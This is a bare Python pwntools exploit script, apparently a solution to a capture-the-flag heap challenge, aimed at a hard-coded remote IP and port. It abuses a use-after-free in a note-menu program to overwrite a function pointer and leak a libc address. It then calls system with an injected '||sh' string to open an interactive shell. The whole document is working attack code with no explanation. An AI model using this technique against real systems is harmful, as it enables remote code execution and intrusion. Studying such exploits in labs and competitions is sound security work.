from pwn import*
context(log_level='DEBUG',arch='amd64')
def add(size,content):
	p.sendlineafter('Your choice :','1')
	p.sendlineafter('Note size :',str(size))
	p.sendafter('Content :',content)
def free(index):
	p.sendlineafter('Your choice :','2')
	p.sendlineafter('Index :',str(index))
def show(index):
	p.sendlineafter('Your choice :','3')
	p.sendlineafter('Index :',str(index))

p = remote('111.198.29.45',53083)
add(0x20,'FMYY')
add(0x20,'FMYY')
free(0)
free(1)
add(8,p32(0x804862B) + p32(0x0804A00C))
show(0)
libc_base = u32(p.recv(4)) - 0x0D4350
system = 0x03A940 + libc_base
binsh =  0x15902B + libc_base
free(2)
add(8,p32(system) + '||sh')
show(0)
p.interactive()

